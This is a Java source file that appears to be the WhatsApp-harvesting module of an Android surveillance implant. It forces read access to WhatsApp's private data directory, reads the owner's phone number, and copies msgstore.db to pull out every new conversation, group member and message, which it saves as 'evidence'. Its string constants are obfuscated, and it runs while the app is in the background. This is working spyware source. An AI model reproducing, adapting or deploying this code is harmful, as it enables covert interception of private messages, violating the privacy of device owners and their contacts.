package com.android.dvci.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.dvci.RunningProcesses;
import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.Path;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

public class ChatWhatsapp extends SubModuleChat {
	private static final String TAG = "ChatWhatsapp";

	ChatGroups groups = new ChatWhatsappGroups();

	private static final int PROGRAM = 0x06;

	private static final String DEFAULT_LOCAL_NUMBER = "local";
	String pObserving = M.e("com.whatsapp");

	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}

		try {
			readChatWhatsappMessages();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		try {
			myPhoneNumber = readMyPhoneNumber();

			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
				enabled = false;
				return;
			}

			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);

			RunningProcesses runningProcesses = new RunningProcesses();
			if(!runningProcesses.getForeground().equals(pObserving)) {
				readChatWhatsappMessages();
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), " + e);
			}
		}

	}

	private String readMyPhoneNumber() {
		String myPhone = DEFAULT_LOCAL_NUMBER;
		String myCountryCode = "";

		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
		try {
			Path.unprotect(filename, 2, true);
			File file = new File(filename);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			// Element root = doc.getDocumentElement();
			// root.getElementsByTagName("string");

			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");

			for (int i = 0; i < stringNodes.getLength(); i++) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
				}
				// f_e=com.whatsapp.RegisterPhone.phone_number
				if (item != null && M.e("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
					}
					myPhone = node.getFirstChild().getNodeValue();
				}

				if (item != null && M.e("com.whatsapp.RegisterPhone.country_code").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found country code: " + item);
					}
					myCountryCode = "+" + node.getFirstChild().getNodeValue();
				}
			}

		} catch (Exception e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		}

		return myCountryCode + myPhone;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	/**
	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
	 * messaggi relativi
	 * 
	 * @throws IOException
	 */
	private void readChatWhatsappMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}
			return;
		}

		try {

			long lastWhatsapp = markup.unserialize(new Long(0));

			boolean updateMarkup = false;

			// f.0=/data/data/com.whatsapp/databases
			String dbDir = M.e("/data/data/com.whatsapp/databases");
			// f.1=/msgstore.db
			String dbFile = M.e("/msgstore.db");

			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatWhatsappMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				if (helper == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatWhatsappMessages) Error, file not readable: " + dbFile);
					}
					return;
				}
				try {
					SQLiteDatabase db = helper.getReadableDatabase();

					// retrieve a list of all the conversation changed from the last
					// reading. Each conversation contains the peer and the last id
					ArrayList<String> changedConversations = fetchConversation(db, lastWhatsapp);
					// helper.disposeDb();

					// helper = GenericSqliteHelper.open(dbDir, dbFile);
					// for every conversation, fetch and save message and update
					// markup

					long newLastRead = lastWhatsapp;
					for (String conversation : changedConversations) {

						if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
							fetchGroup(helper, conversation);
						}

						newLastRead = fetchMessages(db, conversation, lastWhatsapp);

						if (Cfg.DEBUG) {
							Check.log(TAG + " (readChatMessages): fetchMessages " + conversation
									+ " newLastRead " + newLastRead);
						}

						updateMarkup = true;
					}

					if (updateMarkup) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readChatMessages): updating markup");
						}
						markup.writeMarkupSerializable(newLastRead);
					}
				}finally {
					helper.disposeDb();
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchGroup) : " + conversation);
		}

		// SELECT _id,remote_resource where key_remote_jid=1
		// f.4=_id
		// f.5=key_remote_jid
		// f_f=remote_resources
		String[] projection = {  M.e("remote_resource") };
		String selection = M.e("key_remote_jid") + "='" + conversation + "'";

		// final Set<String> remotes = new HashSet<String>();
		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				//int id = cursor.getInt(0);
				String remote = cursor.getString(0);
				// remotes.add(remote);
				if (remote != null) {
					groups.addPeerToGroup(conversation, clean(remote));
				}
				return 0;
			}
		};

		helper.traverseRecords(M.e("messages"), visitor, true);

	}

	/**
	 * Retrieves the list of the conversations and their last read message.
	 *
	 * @param db
	 * @return
	 */
	private ArrayList<String> fetchConversation(SQLiteDatabase db, long lastWhatsapp) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}

		ArrayList<String> changedConversations = new ArrayList<String>();
		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.3=chat_list
		queryBuilderIndex.setTables(M.e("chat_list"));
		queryBuilderIndex.appendWhere("sort_timestamp > " + lastWhatsapp);
		// queryBuilder.appendWhere(inWhere);
		// f.4=_id
		// f.5=key_remote_jid
		// f.6=message_table_id
		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.e("key_remote_jid")));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.e("message_table_id")));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(jid);
			}

		}
		cursor.close();
		return changedConversations;
	}

	/**
	 * Fetch unread messages of a specific conversation
	 * 
	 * @param db
	 * @param conversation
	 * @return
	 */
	private long fetchMessages(SQLiteDatabase db, String conversation, long lastWhatsapp) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastWhatsapp);
		}

		String peer = clean(conversation);

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.a=messages
		queryBuilderIndex.setTables(M.e("messages"));
		// f.4=_id
		// f.5=key_remote_jid
		queryBuilderIndex.appendWhere(M.e("key_remote_jid") + " = '" + conversation + "' AND " + M.e("timestamp") + " > "
				+ lastWhatsapp);
		// f.7=data
		// f_b=timestamp
		// f_c=key_from_me
		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),
				"remote_resource" };

		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
		// AND key_remote_jid>$lastReadIndex
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("timestamp"));

		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		long lastRead = lastWhatsapp;
		while (cursor != null && cursor.moveToNext()) {
			int index = cursor.getInt(0); // f_4
			String message = cursor.getString(2); // f_7
			Long timestamp = cursor.getLong(3); // f_b
			boolean incoming = cursor.getInt(4) != 1; // f_
			String remote = clean(cursor.getString(5));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
			}
			lastRead = Math.max(timestamp, lastRead);

			if (StringUtils.isEmpty(message)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages), empty message");
				}
				continue;

			}

			if (Cfg.DEBUG) {
				// Check.log(TAG + " (fetchMessages): " +
				// StringUtils.byteArrayToHexString(message.getBytes()));
			}

			String from = incoming ? peer : myPhoneNumber;
			String to = incoming ? myPhoneNumber : peer;

			// if (groups.isGroup(peer)) {
			// to = groups.getGroupTo(from, peer);
			// }

			if (groups.isGroup(peer)) {
				if (incoming) {
					from = remote;
				} else {
					// to = groups.getGroupTo(from, peer);
				}
				to = groups.getGroupToName(from, peer);
			}

			if (to != null && from != null && message != null) {
				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages) Error, null values");
				}
			}

		}
		cursor.close();
		getModule().saveEvidence(messages);
		return lastRead;
	}

	private String clean(String remote) {
		if (remote == null) {
			return null;
		}
		// f_9=@s.whatsapp.net
		return remote.replaceAll(M.e("@s.whatsapp.net"), "");
	}
	
	public class ChatWhatsappGroups extends ChatGroups {
		@Override
		boolean isGroup(String peer) {
			return peer.contains("@g.");
		}

	}

}
